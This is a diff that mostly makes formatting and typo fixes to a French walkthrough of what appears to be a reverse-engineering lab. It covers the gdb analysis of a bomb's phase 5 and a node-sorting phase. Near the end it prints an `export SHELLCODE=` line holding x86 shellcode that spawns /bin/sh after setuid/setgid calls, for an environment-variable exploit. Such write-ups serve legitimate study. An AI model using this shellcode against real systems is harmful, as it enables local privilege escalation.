@@ -629,17 +629,17 @@ Le 4ème mot de passe est donc simplement : `9`.
 
 ### 5ème étape
 
-Nous commencons par ```disas phase_5``` et observons ce qu'il se passe.
-Nous savons que notre chaîne de caractères doit contenir 6 caractères car un _cmp_ est effectué avec 6 et le retour d'une fonction qui compte le nombre de caractères de notre argument.
+Nous commencons par `disas phase_5` et observons ce qu'il se passe.
+Nous savons que notre chaîne de caractères doit contenir 6 caractères car un `cmp` est effectué avec `6` et le retour d'une fonction qui compte le nombre de caractères de notre argument.
 
-Ensuite, en parcourant chaque opération, nous voyons qu'un registre _%edx_ est incrémenté à `<phase_5 + 57>`, suivi d'une instruction jump-less-than juste après qui nous ramène à `<phase_5 + 43>`.
+Ensuite, en parcourant chaque opération, nous voyons qu'un registre `%edx` est incrémenté à `<phase_5 + 57>`, suivi d'une instruction _jump-less-than_ juste après qui nous ramène à `<phase_5 + 43>`.
 Une boucle est en train de se produire. Et, comme on peut le voir sur la structure `<phase_5 + 58>`, la boucle itère 6 fois.
 Étant donné que notre chaîne comporte 6 caractères, il est logique de supposer que la fonction parcourt chaque caractère de la boucle et fait vraisemblablement quelque chose avec eux.
 
-Enfin, nous pouvons voir en bas de la fonction que `<strings_not_equal>` est appelé après que le contenu de _%eax_ et l'adresse fixe `0x804980b` ait été poussés sur la stack.
-Le code compare la chaîne (probablement notre entrée) stockée dans _%eax_ à une chaîne fixe stockée à `0x804980b`.
+Enfin, nous pouvons voir en bas de la fonction que `<strings_not_equal>` est appelé après que le contenu de `%eax` et l'adresse fixe `0x804980b` ait été poussés sur la stack.
+Le code compare la chaîne (probablement notre entrée) stockée dans `%eax` à une chaîne fixe stockée à `0x804980b`.
 
-On run avec '123456' en argument et regardons ce qu\'il ce passe.
+On run avec `123456` en argument et regardons ce qu'il ce passe.
 
 ```
 [...]
@@ -666,9 +666,9 @@ End of assembler dump.
 
 Nous savons maintenant que notre chaîne devrait sortir de la boucle en tant que `giants` car notre string est comparé à la valeur contenu dans `0x804980b` qui se trouve être la chaîne : `giants`.
 
-'123456' devient 'srveaw'. Il semble que la boucle soit une boucle qui chiffre la chaîne.
+`123456` devient `srveaw`. Il semble que la boucle soit une boucle qui chiffre la chaîne.
 
-En observant le code de-assemblé nous pouvons voir que juste avant la boucle de vérification de _len_, le contenu d'une adresse fixe `$0x804b220` est chargé dans _$esi_.
+En observant le code désassemblé nous pouvons voir que juste avant la boucle de vérification de `len`, le contenu d'une adresse fixe `$0x804b220` est chargé dans `$esi`.
 
 ```
 (gdb) x/16c $esi
@@ -676,7 +676,7 @@ En observant le code de-assemblé nous pouvons voir que juste avant la boucle de
 0x804b228 <array.123+8>:	111 'o'	98 'b'	112 'p'	110 'n'	117 'u'	116 't'	102 'f'	103 'g'
 ```
 
-On peut également se rendre compte qu'à chaque tour de boucle un `AND 0xf` est appliqué à chacun de nos caractères passés en argument.
+Nous pouvons également nous rendre compte qu'à chaque tour de boucle un `AND 0xf` est appliqué à chacun de nos caractères passés en argument :
 
 ```
 0x08048d5a <+46>:	and    $0xf,%al
@@ -685,7 +685,7 @@ On peut également se rendre compte qu'à chaque tour de boucle un `AND 0xf` est
 Cela ressemble a un tableau de correspondance: un index correspond à un caractère.
 Pour le vérifier éxecutons le code suivant :
 
-```c
+```C
 #include <stdio.h>
 
 int main ()
@@ -919,7 +919,7 @@ node | value | index | next
 Et comme la dernière partie classe les maillons par ordre décroissant selon le champ _value_ nous avons :
 
 node | value | index |
----|---|---|---
+---|---|---
 4 | 0x000003e5 | 4 
 2 | 0x000002d5 | 2 
 6 | 0x000001b0 | 6 
@@ -949,7 +949,7 @@ Rentrez directement dans le shell :
 $> export SHELLCODE=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'
 ```
 
-Ce qui correspond à l'ouverture d'un shell en `shellcode`.
+Ce qui correspond à l'ouverture d'un shell en _shellcode_.
 
 Le programme suivant est à copier/coller, à compiler et exécuter. Il renvoit l'adresse à laquelle se trouve la variable d'environnement `SHELLCODE` (que nous avons donc modifié précédemment).
 
